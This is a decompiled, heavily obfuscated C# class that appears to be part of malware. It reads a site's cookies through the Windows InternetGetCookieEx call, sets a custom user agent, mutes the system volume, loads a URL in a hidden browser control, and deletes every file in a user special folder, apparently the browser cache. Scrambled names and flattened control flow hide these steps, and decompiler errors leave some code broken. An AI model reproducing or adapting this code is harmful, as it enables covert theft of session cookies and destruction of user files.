using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace e4Wlh5D65p;

internal class fKbAs7HNgNWN
{
	private const int AgEY0rL2R1si = 8192;

	private const int mUpfeucINy8o = 268435457;

	[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool InternetGetCookieEx(string qK2CSPDZOdzE, string P5ucUo0dbmPj, StringBuilder igq6d41IabL4, ref uint Wknp3PGtatIp, int int_0, IntPtr dxUhmOsZwcYg);

	[DllImport("urlmon.dll", CharSet = CharSet.Ansi)]
	private static extern int UrlMkSetSessionOption(int Ng3DB9fwjyY9, string i4lVY2zexnx0, int nST9HVktk81p, int qk5b3zYN0FAL);

	[DllImport("winmm.dll")]
	private static extern int waveOutSetVolume(IntPtr geTIyLrdXq2K, uint xaErTojuz4g2);

	public string lok2iEEfbzjm(string x26U9ZG3sKtf, string string_0)
	{
		//IL_0197: Incompatible stack heights: 0 vs 1
		//IL_019e: Incompatible stack heights: 0 vs 1
		int num = _003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(1565316700u);
		string result = default(string);
		try
		{
			StringBuilder stringBuilder = default(StringBuilder);
			while (true)
			{
				method_0(x26U9ZG3sKtf, string_0);
				uint Wknp3PGtatIp = (uint)_003CModule_003E.EzZuznnmuNTnMxMMpuvJiASxoEtj<int>(570979710u);
				while (true)
				{
					int num2 = 149784525;
					while (true)
					{
						int num3 = num2;
						uint num4;
						switch ((num4 = (uint)(((num3 ^ 0x2C981154) + -1804516287) * -1361727103 * -1949049321 + 10107207)) % 8u)
						{
						case 7u:
						{
							int num7;
							int num8;
							if (fKbAs7HNgNWN.gNhuMdBaOtvDbVWgWqLeezaqxmvj(stringBuilder) > _003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(2607518149u))
							{
								num7 = -1321225909;
								num8 = -1321225909;
							}
							else
							{
								num7 = -64319160;
								num8 = -64319160;
							}
							num2 = num7 ^ ((int)num4 * -619563812);
							continue;
						}
						case 6u:
							num += _003CModule_003E.KxzuPupMzMiGxSqZTLmoeoslGwqG<int>(716240967u);
							num2 = 1568274552;
							continue;
						case 5u:
						{
							stringBuilder = fKbAs7HNgNWN.uOZsjdMxsnSvkRaUoXOYIonHcoYCA((int)Wknp3PGtatIp);
							int num5;
							int num6;
							if (InternetGetCookieEx(x26U9ZG3sKtf, null, stringBuilder, ref Wknp3PGtatIp, _003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(3659739166u), IntPtr.Zero))
							{
								num5 = 501708717;
								num6 = 501708717;
							}
							else
							{
								num5 = 1091227290;
								num6 = 1091227290;
							}
							num2 = num5 ^ ((int)num4 * -812518386);
							continue;
						}
						case 3u:
							result = fKbAs7HNgNWN.xoBDVacVYHbzLtfmvgKwxAIKirhEb((object)stringBuilder);
							num2 = (int)(num4 * 2110502910) ^ -319154604;
							continue;
						case 2u:
							goto IL_00c9;
						case 0u:
							break;
						default:
							result = string.Empty;
							return result;
						case 4u:
							return result;
						}
						break;
						IL_00c9:
						if (num != _003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(716702096u))
						{
							goto end_IL_0135;
						}
						num2 = (int)(num4 * 1105478277) ^ -30514029;
					}
					continue;
					end_IL_0135:
					break;
				}
			}
		}
		catch
		{
			while (true)
			{
				_ = -1369067067;
				while (true)
				{
					int num3 = (int)/*Error near IL_014b: Stack underflow*/;
					uint num4;
					switch ((num4 = (uint)(((num3 ^ 0x2C981154) + -1804516287) * -1361727103 * -1949049321 + 10107207)) % 3u)
					{
					case 2u:
						result = string.Empty;
						_ = ((int)num4 * -1034505861) ^ -339180432;
						continue;
					case 0u:
						break;
					default:
						return result;
					case 1u:
						return result;
					}
					break;
				}
			}
		}
	}

	private void method_0(string sPnl2KsQIslV, string yjdWtJo1rkLT)
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		try
		{
			method_1();
			UrlMkSetSessionOption(_003CModule_003E.HluzEQxxNtfrJdgIIEBNrbwqIfBV<int>(1905268847u), yjdWtJo1rkLT, fKbAs7HNgNWN.dRDEapfrsRcErDRBnwdljyzTmfkuA(yjdWtJo1rkLT), _003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(1384272914u));
			WebBrowser obj = fKbAs7HNgNWN.cVzOTFEdaXHvdbSfljXPWovZNESW();
			fKbAs7HNgNWN.YtCnvBjBWftItvnPHSlEzeAxAkMcA(obj, new WebBrowserDocumentCompletedEventHandler(CnOIQWHkZHjS));
			fKbAs7HNgNWN.HHnMxAmyxJkqcGCJwYKavSdySmjR(obj, (byte)_003CModule_003E.VguPgoTrXvPCMVGFojAhlJGYxlME<int>(3527819389u) != 0);
			fKbAs7HNgNWN.rvaFejZgzciiksaNPoZkWbbyDqBd(obj, (byte)_003CModule_003E.hhxFDPmIHoufoEIvTzswdgBraYsK<int>(4229151622u) != 0);
			fKbAs7HNgNWN.LcYrYfoYmOQXdUDJLztMJnwqaLLiA(obj, (byte)_003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<int>(2905113583u) != 0);
			fKbAs7HNgNWN.WcdIataYCNevaFepTLxYrROpnNem(obj, (byte)_003CModule_003E.UNpeudLVrCeWTfHRAripDTEZGeucb<int>(1164952981u) != 0);
			fKbAs7HNgNWN.IbaeHCtLwMpAKTAENtffNotSpBRl((byte)_003CModule_003E.oZKbtXhkfKQqSoVewawcpTWyQNDq<int>(2607518149u) != 0);
			fKbAs7HNgNWN.imPOAvWmulZfxeGPJOyPunkYFCnl(obj, sPnl2KsQIslV, (string)null, (byte[])null, _003CModule_003E.CDJOszaQNoeKbsuQafaZClVuiXyw<string>(3084061005u));
			tbgwE7xQQniy(_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(1107493561u));
			fKbAs7HNgNWN.jdLssOGZanVblCnxfvJeuJoEKjwk();
			fKbAs7HNgNWN.kOirxWJBaXFSYIcoioMEdQlErHBdA(obj);
			fKbAs7HNgNWN.oBVNuLHUbfPiScynkXhTeQdjDcDE((Component)(object)obj);
		}
		catch
		{
		}
	}

	private void tbgwE7xQQniy(int Rpq60kdHWZJi)
	{
		try
		{
			int num = _003CModule_003E.jvPOUHKshbGFGQgOLofQnirJPPcO<int>(3688623593u) * Rpq60kdHWZJi;
			uint xaErTojuz4g = (uint)((num & _003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(633941597u)) | (num << _003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(1050487505u)));
			waveOutSetVolume(IntPtr.Zero, xaErTojuz4g);
		}
		catch
		{
		}
	}

	private void CnOIQWHkZHjS(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		if (fKbAs7HNgNWN.PDwzhfheynGKHHSxScPLftLesBPFA(fKbAs7HNgNWN.YvoiNsXRAvDJxoJLzfJRKavjHcFDb((WebBrowser)((sender is WebBrowser) ? sender : null)), fKbAs7HNgNWN.KOiRQgmbruueQcGbPMiDIwFjohXE(e)))
		{
			int num4 = default(int);
			while (true)
			{
				int num = 1817354300;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)((((num2 ^ -1605540797) * -2029998655 * -1877257655) ^ 0xEE5C4C3) * -574094187)) % 5u)
					{
					case 4u:
						break;
					case 3u:
						num4 = _003CModule_003E.feoSSsxfXyCnLajslDIWWVahFHAQ<int>(1143276503u);
						num = ((int)num3 * -1692230780) ^ -177353747;
						continue;
					case 2u:
						fKbAs7HNgNWN.XBToXULPjDNAIHarlQEEJiQHXDoI();
						fKbAs7HNgNWN.WWtcvOCFfWrWEXjaIzbcdemvuwWbA(_003CModule_003E.YeTsCzhBxwbuusyUXfHIrAUgqOwf<int>(89552963u));
						num4 += _003CModule_003E.uOEawSQeKOanYoNdnVfHYmJRkoNS<int>(1762301344u);
						num = 18039549;
						continue;
					case 0u:
						goto end_IL_0086;
					default:
						goto end_IL_00c5;
					}
					int num5;
					if (num4 < _003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(2100229122u))
					{
						num = 991482720;
						num5 = 991482720;
					}
					else
					{
						num = 510323907;
						num5 = 510323907;
					}
					continue;
					end_IL_0086:
					break;
				}
				continue;
				end_IL_00c5:
				break;
			}
		}
		fKbAs7HNgNWN.JFaawWVMYYfIGLQXVqmfReahZVH();
	}

	private void method_1()
	{
		string[] array = fKbAs7HNgNWN.xSRIiSnGYOSTTNlByzDnMRJVwjNe(fKbAs7HNgNWN.QYwEvwcqCSTcuphpDeFyipJBShAMc((Environment.SpecialFolder)_003CModule_003E.hhxFDPmIHoufoEIvTzswdgBraYsK<int>(350683571u)));
		int num4 = default(int);
		while (true)
		{
			int num = -175033944;
			while (true)
			{
				int num2 = num;
				int num5;
				uint num3;
				switch ((num3 = (uint)(-1703887040 - ~(498946897 - (num2 ^ 0x5A8056E5)) - -1344102880)) % 4u)
				{
				case 1u:
					goto IL_0017;
				case 0u:
					break;
				case 3u:
					if (num4 >= array.Length)
					{
						num5 = -1225392547;
						goto IL_0093;
					}
					goto default;
				default:
					{
						string string_ = array[num4];
						try
						{
							fKbAs7HNgNWN.XDwmHQRpRzdxiNLEdApaCsGvzxIqA(string_);
						}
						catch
						{
						}
						num4 += _003CModule_003E.VguPgoTrXvPCMVGFojAhlJGYxlME<int>(3527819389u);
						goto IL_008e;
					}
					IL_008e:
					num5 = -379337525;
					goto IL_0093;
					IL_0093:
					num2 = num5;
					switch ((num3 = (uint)(-1703887040 - ~(498946897 - (num2 ^ 0x5A8056E5)) - -1344102880)) % 3u)
					{
					case 1u:
						break;
					case 0u:
						goto IL_008e;
					default:
						return;
					case 2u:
						return;
					}
					goto case 3u;
				}
				break;
				IL_0017:
				num4 = _003CModule_003E.SLiDcqHjvKywkpNIakyLDdRfDXoKA<int>(1565316700u);
				num = ((int)num3 * -1655250502) ^ 0x14208728;
			}
		}
	}

	static StringBuilder uOZsjdMxsnSvkRaUoXOYIonHcoYCA(int int_0)
	{
		return new StringBuilder(int_0);
	}

	static int gNhuMdBaOtvDbVWgWqLeezaqxmvj(StringBuilder stringBuilder_0)
	{
		return stringBuilder_0.Length;
	}

	static string xoBDVacVYHbzLtfmvgKwxAIKirhEb(object object_0)
	{
		return object_0.ToString();
	}

	static int dRDEapfrsRcErDRBnwdljyzTmfkuA(string string_0)
	{
		return string_0.Length;
	}

	static WebBrowser cVzOTFEdaXHvdbSfljXPWovZNESW()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new WebBrowser();
	}

	static void YtCnvBjBWftItvnPHSlEzeAxAkMcA(WebBrowser webBrowser_0, WebBrowserDocumentCompletedEventHandler webBrowserDocumentCompletedEventHandler_0)
	{
		webBrowser_0.add_DocumentCompleted(webBrowserDocumentCompletedEventHandler_0);
	}

	static void HHnMxAmyxJkqcGCJwYKavSdySmjR(WebBrowser webBrowser_0, bool bool_0)
	{
		webBrowser_0.set_AllowNavigation(bool_0);
	}

	static void rvaFejZgzciiksaNPoZkWbbyDqBd(WebBrowser webBrowser_0, bool bool_0)
	{
		webBrowser_0.set_AllowWebBrowserDrop(bool_0);
	}

	static void LcYrYfoYmOQXdUDJLztMJnwqaLLiA(WebBrowser webBrowser_0, bool bool_0)
	{
		webBrowser_0.set_ScriptErrorsSuppressed(bool_0);
	}

	static void WcdIataYCNevaFepTLxYrROpnNem(WebBrowser webBrowser_0, bool bool_0)
	{
		webBrowser_0.set_WebBrowserShortcutsEnabled(bool_0);
	}

	static void IbaeHCtLwMpAKTAENtffNotSpBRl(bool bool_0)
	{
		Control.set_CheckForIllegalCrossThreadCalls(bool_0);
	}

	static void imPOAvWmulZfxeGPJOyPunkYFCnl(WebBrowser webBrowser_0, string string_0, string string_1, byte[] byte_0, string string_2)
	{
		webBrowser_0.Navigate(string_0, string_1, byte_0, string_2);
	}

	static void jdLssOGZanVblCnxfvJeuJoEKjwk()
	{
		Application.Run();
	}

	static void kOirxWJBaXFSYIcoioMEdQlErHBdA(WebBrowser webBrowser_0)
	{
		webBrowser_0.Stop();
	}

	static void oBVNuLHUbfPiScynkXhTeQdjDcDE(Component component_0)
	{
		component_0.Dispose();
	}

	static Uri YvoiNsXRAvDJxoJLzfJRKavjHcFDb(WebBrowser webBrowser_0)
	{
		return webBrowser_0.get_Url();
	}

	static Uri KOiRQgmbruueQcGbPMiDIwFjohXE(WebBrowserDocumentCompletedEventArgs webBrowserDocumentCompletedEventArgs_0)
	{
		return webBrowserDocumentCompletedEventArgs_0.get_Url();
	}

	static bool PDwzhfheynGKHHSxScPLftLesBPFA(Uri uri_0, Uri uri_1)
	{
		return uri_0 == uri_1;
	}

	static void XBToXULPjDNAIHarlQEEJiQHXDoI()
	{
		Application.DoEvents();
	}

	static void WWtcvOCFfWrWEXjaIzbcdemvuwWbA(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static void JFaawWVMYYfIGLQXVqmfReahZVH()
	{
		Application.ExitThread();
	}

	static string QYwEvwcqCSTcuphpDeFyipJBShAMc(Environment.SpecialFolder specialFolder_0)
	{
		return Environment.GetFolderPath(specialFolder_0);
	}

	static string[] xSRIiSnGYOSTTNlByzDnMRJVwjNe(string string_0)
	{
		return Directory.GetFiles(string_0);
	}

	static void XDwmHQRpRzdxiNLEdApaCsGvzxIqA(string string_0)
	{
		File.Delete(string_0);
	}
}
